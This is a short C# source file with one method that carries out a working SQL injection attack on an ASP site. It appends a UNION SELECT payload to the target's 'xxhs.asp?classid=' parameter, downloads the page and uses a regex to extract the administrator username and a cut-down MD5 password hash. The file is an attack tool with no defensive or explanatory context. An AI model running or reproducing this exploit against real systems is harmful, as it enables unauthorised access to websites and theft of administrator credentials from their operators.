using System;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
namespace windowsmanger
{
	internal class zhuangxiu
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				string exps = "/xxhs.asp?classid=72+union+select+1,admin,password,4,5,6+from+admin";
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				WebClient test = new WebClient();
				test.Encoding = Encoding.UTF8;
				//urls + exps;
				string shuju = test.DownloadString(urls + exps);
				string bb = "";
				string cc = "";
				MatchCollection matcha = new Regex("<span.*?12..(?<admin>.*?)</span>(?s).*?style=.padding.top..px..(?<md5>.*?)</td>", RegexOptions.None).Matches(shuju);
				foreach (Match match in matcha)
				{
					bb = match.Groups["admin"].ToString();
					cc = match.Groups["md5"].ToString();
					cc = cc.Substring(16, 16);
				}
				result = bb + "++" + cc;
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
